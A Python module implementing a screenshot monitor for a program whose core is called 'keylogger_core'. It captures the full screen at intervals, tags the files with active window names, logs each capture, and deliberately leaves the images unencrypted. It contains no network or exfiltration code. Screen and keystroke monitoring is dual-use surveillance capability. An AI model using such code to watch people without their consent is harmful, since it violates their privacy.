"""Screenshot monitoring utility with security and performance optimizations."""

import time
import threading
import logging
import os
from typing import Optional, Dict, Any, Tuple
from pathlib import Path
from PIL import Image, ImageDraw, ImageFont
import io
import hashlib

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None
    logging.warning("PIL ImageGrab not available")

logger = logging.getLogger(__name__)


class ScreenshotMonitor:
    """Monitor and capture screenshots with privacy and performance features."""
    
    def __init__(self, keylogger_core):
        self.keylogger_core = keylogger_core
        self.config = keylogger_core.config
        self.is_running = False
        
        # Screenshot settings
        self.capture_interval = float(self.config.get('screenshots.interval_seconds', self.config.get('performance.screenshot_interval', 60.0)))
        self.screenshot_quality = self.config.get('screenshots.quality', self.config.get('performance.screenshot_quality', 85))
        # Force PNG format for high quality and accessibility
        self.screenshot_format = 'PNG'
         
        # Privacy settings
        self.blur_sensitive_areas = self.config.get('privacy.blur_sensitive_areas', True)
        self.redact_text = self.config.get('privacy.redact_screenshot_text', False)
        # Prefer screenshots.max_width/height; fallback to privacy.max_screenshot_resolution or default
        max_width = self.config.get('screenshots.max_width', None)
        max_height = self.config.get('screenshots.max_height', None)
        if isinstance(max_width, int) and isinstance(max_height, int) and max_width > 0 and max_height > 0:
            self.max_resolution = (max_width, max_height)
        else:
            self.max_resolution = self.config.get('privacy.max_screenshot_resolution', (1920, 1080))
         
        # Performance settings
        self.compress_screenshots = self.config.get('screenshots.compress', self.config.get('performance.compress_screenshots', True))
        self.max_file_size = self.config.get('performance.max_screenshot_size_mb', 5) * 1024 * 1024
        self.cleanup_old_screenshots = self.config.get('performance.cleanup_old_screenshots', True)
        self.max_screenshots = self.config.get('performance.max_screenshots', 1000)
         
        # Security settings
        # Force screenshots to be unencrypted for accessibility
        self.encrypt_screenshots = False
        self.hash_screenshots = self.config.get('security.hash_screenshots', True)
        
        # Statistics
        self.stats = {
            'screenshots_taken': 0,
            'screenshots_encrypted': 0,
            'total_size_bytes': 0,
            'average_size_bytes': 0,
            'errors': 0,
            'cleanup_operations': 0
        }
        
        # Screenshot metadata
        self.screenshot_metadata: Dict[str, Dict[str, Any]] = {}
        
        # Setup screenshot directory
        self._setup_screenshot_directory()
    
    def _setup_screenshot_directory(self) -> None:
        """Setup screenshot directory with proper permissions."""
        try:
            # Create screenshots directory in the project root
            self.screenshot_dir = Path.cwd() / "screenshots"
            # Determine storage path (prefer screenshots.storage_path)
            storage_path = self.config.get('screenshots.storage_path', 'screenshots') or 'screenshots'
            
            # Resolve base directory relative to the config file location when path is not absolute
            storage_path_obj = Path(storage_path)
            if not storage_path_obj.is_absolute():
                try:
                    config_dir = Path(getattr(self.keylogger_core, 'config_path', 'config.json')).parent.resolve()
                except Exception:
                    config_dir = Path.cwd()
                self.screenshot_dir = (config_dir / storage_path_obj).resolve()
            else:
                self.screenshot_dir = storage_path_obj
            
            self.screenshot_dir.mkdir(parents=True, exist_ok=True)
            logger.info(f"Screenshot directory setup: {self.screenshot_dir}")
            
        except Exception as e:
            logger.error(f"Failed to setup screenshot directory: {e}")
            # Fallback to current working directory
            self.screenshot_dir = Path.cwd()
            logger.warning(f"Using fallback directory: {self.screenshot_dir}")
    
    def run(self) -> None:
        """Main screenshot monitoring loop."""
        logger.info("Screenshot monitor run() method called")
        
        if not self._check_screenshot_support():
            logger.error("Screenshot capture not supported")
            return
        
        self.is_running = True
        logger.info(f"Screenshot monitor started - interval: {self.capture_interval}s, directory: {self.screenshot_dir}")
        
        try:
            while self.is_running and not self.keylogger_core.stop_event.is_set():
                try:
                    self._capture_screenshot()
                    
                    # Cleanup old screenshots if needed
                    if self.cleanup_old_screenshots:
                        self._cleanup_old_screenshots()
                    
                    # Wait for next capture
                    if self.keylogger_core.stop_event.wait(self.capture_interval):
                        break
                    
                except Exception as e:
                    logger.error(f"Error in screenshot monitoring loop: {e}")
                    self.stats['errors'] += 1
                    time.sleep(self.capture_interval)
            
        except Exception as e:
            logger.error(f"Critical error in screenshot monitor: {e}")
        finally:
            logger.info(f"Screenshot monitor stopped. Stats: {self.stats}")
    
    def _check_screenshot_support(self) -> bool:
        """Check if screenshot capture is supported."""
        if ImageGrab is None:
            logger.error("PIL ImageGrab not available")
            return False
        
        try:
            # Test screenshot capture
            test_img = ImageGrab.grab(bbox=(0, 0, 100, 100))
            if test_img is None:
                return False
            return True
        except Exception as e:
            logger.error(f"Screenshot test failed: {e}")
            return False
    
    def _capture_screenshot(self) -> Optional[str]:
        """Capture and process screenshot."""
        try:
            # Get current window info for context
            window_name = self.keylogger_core.session_stats.get('active_window', 'Unknown')
            
            # Skip if application is excluded
            if self.keylogger_core.config.is_application_excluded(window_name):
                return None
            
            # Capture screenshot
            screenshot = ImageGrab.grab()
            if screenshot is None:
                logger.warning("Failed to capture screenshot")
                return None
            
            # Process screenshot
            processed_screenshot = self._process_screenshot(screenshot)
            
            # Generate filename
            timestamp = time.time()
            filename = self._generate_filename(timestamp, window_name)
            filepath = self.screenshot_dir / filename
            
            # Save screenshot
            file_size = self._save_screenshot(processed_screenshot, filepath)
            
            if file_size > 0:
                # Update statistics
                self.stats['screenshots_taken'] += 1
                self.stats['total_size_bytes'] += file_size
                self.stats['average_size_bytes'] = self.stats['total_size_bytes'] / self.stats['screenshots_taken']
                
                # Store metadata
                self._store_metadata(filename, {
                    'timestamp': timestamp,
                    'window_name': window_name,
                    'file_size': file_size,
                    'resolution': processed_screenshot.size,
                    'format': self.screenshot_format
                })
                
                # Log screenshot event
                self._log_screenshot_event(filename, window_name, file_size)
                
                return str(filepath)
            
        except Exception as e:
            logger.error(f"Error capturing screenshot: {e}")
            self.stats['errors'] += 1
            return None
    
    def _process_screenshot(self, screenshot: Image.Image) -> Image.Image:
        """Process screenshot with privacy and performance optimizations."""
        try:
            processed = screenshot.copy()
            
            # Resize if too large
            if processed.size[0] > self.max_resolution[0] or processed.size[1] > self.max_resolution[1]:
                processed.thumbnail(self.max_resolution, Image.Resampling.LANCZOS)
            
            # Apply privacy filters
            if self.blur_sensitive_areas:
                processed = self._blur_sensitive_areas(processed)
            
            if self.redact_text:
                processed = self._redact_text_areas(processed)
            
            # Convert to RGB if necessary (for JPEG)
            if self.screenshot_format.upper() == 'JPEG' and processed.mode in ('RGBA', 'LA', 'P'):
                rgb_image = Image.new('RGB', processed.size, (255, 255, 255))
                if processed.mode == 'P':
                    processed = processed.convert('RGBA')
                rgb_image.paste(processed, mask=processed.split()[-1] if processed.mode == 'RGBA' else None)
                processed = rgb_image
            
            return processed
            
        except Exception as e:
            logger.error(f"Error processing screenshot: {e}")
            return screenshot
    
    def _blur_sensitive_areas(self, image: Image.Image) -> Image.Image:
        """Blur potentially sensitive areas of the screenshot."""
        try:
            from PIL import ImageFilter
            
            # Simple implementation: blur bottom portion where taskbar/dock might be
            width, height = image.size
            
            # Create a copy for blurring
            blurred = image.copy()
            
            # Blur bottom 10% of screen (taskbar area)
            taskbar_height = int(height * 0.1)
            if taskbar_height > 0:
                taskbar_area = image.crop((0, height - taskbar_height, width, height))
                blurred_taskbar = taskbar_area.filter(ImageFilter.GaussianBlur(radius=10))
                blurred.paste(blurred_taskbar, (0, height - taskbar_height))
            
            # Blur top portion (title bars)
            title_height = int(height * 0.05)
            if title_height > 0:
                title_area = image.crop((0, 0, width, title_height))
                blurred_title = title_area.filter(ImageFilter.GaussianBlur(radius=5))
                blurred.paste(blurred_title, (0, 0))
            
            return blurred
            
        except Exception as e:
            logger.error(f"Error blurring sensitive areas: {e}")
            return image
    
    def _redact_text_areas(self, image: Image.Image) -> Image.Image:
        """Redact potential text areas in the screenshot."""
        try:
            # Simple implementation: overlay semi-transparent rectangles
            # In a real implementation, you might use OCR to detect text
            
            overlay = Image.new('RGBA', image.size, (0, 0, 0, 0))
            draw = ImageDraw.Draw(overlay)
            
            width, height = image.size
            
            # Redact common text areas (this is a simplified approach)
            # Top area (title bars, menu bars)
            draw.rectangle([0, 0, width, int(height * 0.1)], fill=(0, 0, 0, 128))
            
            # Bottom area (status bars)
            draw.rectangle([0, int(height * 0.9), width, height], fill=(0, 0, 0, 128))
            
            # Combine with original image
            result = Image.alpha_composite(image.convert('RGBA'), overlay)
            return result.convert('RGB')
            
        except Exception as e:
            logger.error(f"Error redacting text areas: {e}")
            return image
    
    def _generate_filename(self, timestamp: float, window_name: str) -> str:
        """Generate filename for screenshot."""
        try:
            # Create timestamp string
            time_str = time.strftime('%Y%m%d_%H%M%S', time.localtime(timestamp))
            
            # Sanitize window name for filename
            safe_window_name = "".join(c for c in window_name if c.isalnum() or c in (' ', '-', '_')).strip()
            safe_window_name = safe_window_name.replace(' ', '_')[:50]  # Limit length
            
            # Generate filename
            if safe_window_name:
                filename = f"screenshot_{time_str}_{safe_window_name}.{self.screenshot_format.lower()}"
            else:
                filename = f"screenshot_{time_str}.{self.screenshot_format.lower()}"
            
            return filename
            
        except Exception as e:
            logger.error(f"Error generating filename: {e}")
            return f"screenshot_{int(timestamp)}.{self.screenshot_format.lower()}"
    
    def _save_screenshot(self, image: Image.Image, filepath: Path) -> int:
        """Save screenshot with optional encryption."""
        try:
            # Save to memory buffer first
            buffer = io.BytesIO()
            
            save_kwargs = {}
            if self.screenshot_format.upper() == 'JPEG':
                save_kwargs['quality'] = self.screenshot_quality
                save_kwargs['optimize'] = True
            elif self.screenshot_format.upper() == 'PNG':
                # PNG settings for high quality
                save_kwargs['optimize'] = True
                save_kwargs['compress_level'] = 6  # Good balance between compression and speed
            
            image.save(buffer, format=self.screenshot_format, **save_kwargs)
            image_data = buffer.getvalue()
            
            # Check file size
            if len(image_data) > self.max_file_size:
                logger.warning(f"Screenshot too large ({len(image_data)} bytes), skipping")
                return 0
            
            # Encrypt if enabled
            enc = getattr(self.keylogger_core, 'encryption', None)
            if self.encrypt_screenshots and enc and getattr(enc, 'is_initialized', lambda: False)():
                try:
                    encrypted_data = enc.encrypt(image_data)
                    if not encrypted_data:
                        raise ValueError("Encryption returned no data")
                    filepath = filepath.with_suffix(filepath.suffix + '.enc')
                    with open(filepath, 'wb') as f:
                        f.write(encrypted_data)
                    self.stats['screenshots_encrypted'] += 1
                except Exception as e:
                    logger.warning(f"Encryption unavailable or failed, saving unencrypted: {e}")
                    with open(filepath, 'wb') as f:
                        f.write(image_data)
            else:
                # Save unencrypted
                with open(filepath, 'wb') as f:
                    f.write(image_data)
            
            return len(image_data)
            
        except Exception as e:
            logger.error(f"Error saving screenshot: {e}")
            return 0
    
    def _store_metadata(self, filename: str, metadata: Dict[str, Any]) -> None:
        """Store screenshot metadata."""
        try:
            # Add hash if enabled
            if self.hash_screenshots:
                filepath = self.screenshot_dir / filename
                if filepath.exists():
                    with open(filepath, 'rb') as f:
                        file_hash = hashlib.sha256(f.read()).hexdigest()[:16]
                    metadata['file_hash'] = file_hash
            
            self.screenshot_metadata[filename] = metadata
            
        except Exception as e:
            logger.error(f"Error storing metadata: {e}")
    
    def _log_screenshot_event(self, filename: str, window_name: str, file_size: int) -> None:
        """Log screenshot capture event."""
        try:
            details = f"Screenshot captured: {filename} ({file_size} bytes)"
            
            self.keylogger_core.log_event(
                "Screenshot",
                details,
                window_name,
                metadata={
                    'filename': filename,
                    'file_size': file_size,
                    'encrypted': self.encrypt_screenshots,
                    'format': self.screenshot_format
                }
            )
            
        except Exception as e:
            logger.error(f"Error logging screenshot event: {e}")
    
    def _cleanup_old_screenshots(self) -> None:
        """Cleanup old screenshots to manage disk space."""
        try:
            # Get all screenshot files
            screenshot_files = []
            for ext in ['.jpg', '.jpeg', '.png', '.enc']:
                screenshot_files.extend(self.screenshot_dir.glob(f"*{ext}"))
            
            # Sort by modification time (oldest first)
            screenshot_files.sort(key=lambda x: x.stat().st_mtime)
            
            # Remove excess files
            if len(screenshot_files) > self.max_screenshots:
                files_to_remove = screenshot_files[:-self.max_screenshots]
                
                for file_path in files_to_remove:
                    try:
                        file_path.unlink()
                        # Remove from metadata
                        if file_path.name in self.screenshot_metadata:
                            del self.screenshot_metadata[file_path.name]
                        
                        self.stats['cleanup_operations'] += 1
                        
                    except Exception as e:
                        logger.error(f"Error removing old screenshot {file_path}: {e}")
                
                logger.info(f"Cleaned up {len(files_to_remove)} old screenshots")
            
        except Exception as e:
            logger.error(f"Error during screenshot cleanup: {e}")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get screenshot monitoring statistics."""
        return {
            **self.stats,
            'is_running': self.is_running,
            'screenshot_directory': str(self.screenshot_dir),
            'metadata_entries': len(self.screenshot_metadata)
        }
    
    def get_screenshot_list(self, limit: Optional[int] = None) -> list:
        """Get list of captured screenshots."""
        try:
            screenshots = []
            for filename, metadata in self.screenshot_metadata.items():
                filepath = self.screenshot_dir / filename
                if filepath.exists():
                    screenshots.append({
                        'filename': filename,
                        'filepath': str(filepath),
                        'metadata': metadata
                    })
            
            # Sort by timestamp (newest first)
            screenshots.sort(key=lambda x: x['metadata'].get('timestamp', 0), reverse=True)
            
            if limit:
                screenshots = screenshots[:limit]
            
            return screenshots
            
        except Exception as e:
            logger.error(f"Error getting screenshot list: {e}")
            return []
    
    def capture_immediate_screenshot(self, window_name: str = "Manual") -> Optional[str]:
        """Capture an immediate screenshot outside the normal schedule."""
        try:
            logger.info("Capturing immediate screenshot")
            return self._capture_screenshot()
        except Exception as e:
            logger.error(f"Error capturing immediate screenshot: {e}")
            return None
    
    def export_metadata(self) -> Dict[str, Any]:
        """Export screenshot metadata for analysis."""
        return {
            'stats': self.get_stats(),
            'metadata': self.screenshot_metadata.copy(),
            'export_timestamp': time.time()
        }